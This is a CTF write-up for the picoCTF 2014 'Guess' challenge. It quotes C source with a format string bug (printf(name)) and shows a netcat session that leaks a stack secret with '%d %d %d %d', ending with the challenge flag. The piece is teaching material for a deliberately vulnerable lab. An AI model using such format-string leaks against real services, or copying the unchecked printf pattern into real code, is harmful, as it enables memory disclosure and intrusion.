# Pico CTF 2014 : Guess

**Category:** Binary Exploitation
**Points:** 75
**Description:**

>This program requires you to guess a random 32-bit number! Sounds difficult, right? There is a server running at vuln2014.picoctf.com:4546, and the source can be found [here](guess.c).

**Hint:**
>The only way to combat secure randomness is to leak the secret.

## Write-up

Looking at the source, there are a few important lines.
```
fgets(name, sizeof(name), stdin);

    printf("Welcome to the guessing game, ");
    printf(name);
    printf("\nI generated a random 32-bit number.\nYou have a 1 in 2^32 chance
of guessing it. Good luck.\n");

    printf("What is your guess?\n");
    scanf("%d", &guess);

    if(guess == secret){
```
 
the line that has `printf(name);` is a format string vulnerability. This means
that we can read arbitrary data off of the stack, AKA leak `secret`. Also,
`scanf()` is given the `%d` modifier, meaning we need to supply the guess in
decimal form. It is crucuial to understand that while the value of `secret` is
random, it's location relative to everything else in memory is not. By
supplying some `%d`s to the program, we will get the nearby memory values, one
of which is `secret`. After some trial and error, we find that the fourth value
is `secret`!

```
 nc vuln2014.picoctf.com 4546
Hello! What is your name?
%d %d %d %d
Welcome to the guessing game, 32 -143098848 159907848 381394296

I generated a random 32-bit number.
You have a 1 in 2^32 chance of guessing it. Good luck.
What is your guess?
381394296
Wow! You guessed it!
Your flag is: leak_the_seakret
```






## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/guess.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-guess/>
